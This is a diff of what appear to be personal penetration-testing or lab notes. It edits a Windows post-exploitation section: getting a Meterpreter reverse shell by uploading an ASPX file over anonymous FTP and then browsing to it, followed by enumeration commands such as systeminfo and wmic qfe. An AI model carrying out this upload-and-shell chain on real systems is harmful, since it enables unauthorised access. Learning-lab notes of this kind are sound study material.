@@ -16,9 +16,11 @@ msfconsole > use exploit/multi/handler > options > set payload windows/meterpret
 ftp anonyomous login > `PUT reverse.aspx` > load http://victim/reverse.aspx (to trigger meterpreter reverse shell connection)  
 
 #### System Enumeration  
-now that we are a low level user, we repeat the cycle of info gathering, scanning enumeration further exploitation.
+now that we are a low level user, we repeat the cycle of information gathering, scanning enumeration and further exploitation.  
 
 meterpreter: shell  
-systeminfo  
-hostname  
-
+`systeminfo`  
+`hostname`  
+`hostname`  
+patching checks (windows management instrumentation command line + quick fix engineering) : `wmic qfe` or `wmic qfe get Caption,Description,HotFixID,InstalledOn` for a cleaner view  
+driver enumeration: `wmic logicaldisk get caption,description,providername`
